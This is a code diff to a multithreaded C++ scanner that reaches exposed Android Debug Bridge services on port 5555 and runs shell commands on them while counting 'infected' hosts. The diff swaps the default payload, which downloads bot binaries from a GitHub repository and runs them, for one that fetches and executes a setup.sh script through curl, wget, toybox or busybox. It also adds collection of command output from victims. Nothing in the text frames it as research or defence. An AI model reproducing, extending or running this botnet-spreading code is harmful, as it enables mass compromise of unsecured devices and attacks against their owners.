@@ -172,7 +172,7 @@ static bool exploit_adb(const char *ip, int port, const std::string &command, in
     }
 
     // 2. Open Shell Stream
-    std::string service = "shell:" + command + "\0";
+    std::string service = "shell:" + command;
     uint32_t local_id = 1;
     if (send_packet(fd, A_OPEN, local_id, 0, service.c_str(), service.length() + 1) != 0)
     {
@@ -189,7 +189,31 @@ static bool exploit_adb(const char *ip, int port, const std::string &command, in
 
     if (resp.command == A_OKAY)
     {
+        uint32_t remote_id = resp.arg0;
         total_infected++;
+        
+        std::string output;
+        while (read_packet(fd, &resp, body) == 0)
+        {
+            if (resp.command == A_WRTE)
+            {
+                if (!body.empty())
+                {
+                    output.append(body.data(), body.size());
+                }
+                send_packet(fd, A_OKAY, local_id, remote_id, NULL, 0);
+            }
+            else if (resp.command == A_CLSE)
+            {
+                send_packet(fd, A_CLSE, local_id, remote_id, NULL, 0);
+                break;
+            }
+        }
+        if (!output.empty())
+        {
+            printf("[*] Output from %s:\n%s\n", ip, output.c_str());
+            fflush(stdout);
+        }
         close(fd);
         return true;
     }
@@ -225,13 +249,12 @@ static void *worker_thread(void *arg)
 }
 
 static const char *DEFAULT_PAYLOAD = 
-    "cd /data/local/tmp && "
-    "(curl -s -k -L https://raw.githubusercontent.com/cloudflared9-hub/agent/main/bots/bot -o bot || wget -q --no-check-certificate https://raw.githubusercontent.com/cloudflared9-hub/agent/main/bots/bot -O bot) && "
-    "(curl -s -k -L https://raw.githubusercontent.com/cloudflared9-hub/agent/main/bots/http -o http || wget -q --no-check-certificate https://raw.githubusercontent.com/cloudflared9-hub/agent/main/bots/http -O http) && "
-    "(curl -s -k -L https://raw.githubusercontent.com/cloudflared9-hub/agent/main/bots/https -o https || wget -q --no-check-certificate https://raw.githubusercontent.com/cloudflared9-hub/agent/main/bots/https -O https) && "
-    "(curl -s -k -L https://raw.githubusercontent.com/cloudflared9-hub/agent/main/agent.txt -o agent.txt || wget -q --no-check-certificate https://raw.githubusercontent.com/cloudflared9-hub/agent/main/agent.txt -O agent.txt) && "
-    "chmod +x bot http https && "
-    "nohup ./bot >/dev/null 2>&1 &";
+    "cd /data/local/tmp; "
+    "curl -s -k -L https://raw.githubusercontent.com/cloudflared9-hub/agent/main/bots/setupIoT/setup.sh -o setup.sh || "
+    "wget -q --no-check-certificate https://raw.githubusercontent.com/cloudflared9-hub/agent/main/bots/setupIoT/setup.sh -O setup.sh || "
+    "toybox wget -q --no-check-certificate https://raw.githubusercontent.com/cloudflared9-hub/agent/main/bots/setupIoT/setup.sh -O setup.sh || "
+    "busybox wget -q --no-check-certificate https://raw.githubusercontent.com/cloudflared9-hub/agent/main/bots/setupIoT/setup.sh -O setup.sh; "
+    "chmod 777 setup.sh; sh setup.sh";
 
 int main(int argc, char **argv)
 {
@@ -249,7 +272,7 @@ int main(int argc, char **argv)
     int threads_count = atoi(argv[2]);
     std::string payload_cmd = (argc >= 4 && strcmp(argv[3], "default") != 0) ? argv[3] : DEFAULT_PAYLOAD;
     int port = (argc >= 5) ? atoi(argv[4]) : 5555;
-    int timeout_sec = (argc >= 6) ? atoi(argv[5]) : 5;
+    int timeout_sec = (argc >= 6) ? atoi(argv[5]) : 15;
 
     std::ifstream infile(file_path);
     if (!infile.is_open())
@@ -262,13 +285,17 @@ int main(int argc, char **argv)
     std::string line;
     while (std::getline(infile, line))
     {
-        while (!line.empty() && (line.back() == '\r' || line.back() == '\n' || line.back() == ' '))
+        while (!line.empty() && (line.back() == '\r' || line.back() == '\n' || line.back() == ' ' || line.back() == '\t'))
         {
             line.pop_back();
         }
         if (!line.empty() && line[0] != '#')
         {
-            targets.push_back(line);
+            struct sockaddr_in sa;
+            if (inet_pton(AF_INET, line.c_str(), &(sa.sin_addr)) == 1)
+            {
+                targets.push_back(line);
+            }
         }
     }
     infile.close();
